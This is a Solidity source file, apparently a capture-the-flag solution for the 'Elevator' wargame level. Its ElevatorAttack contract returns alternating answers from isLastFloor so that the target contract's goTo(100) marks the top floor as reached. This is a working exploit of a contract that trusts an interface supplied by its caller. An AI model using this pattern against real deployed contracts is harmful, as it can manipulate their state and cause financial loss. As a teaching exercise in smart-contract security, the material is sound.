// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    bool tick;

    constructor() {
        tick = true;
    }

    function isLastFloor(uint256 _last) external returns (bool) {
        if (_last == 100) {
            tick = !tick;
        }

        return tick;
    }

    function attack(address _instance) public {
        Elevator ev = Elevator(_instance);

        ev.goTo(100);
    }
}
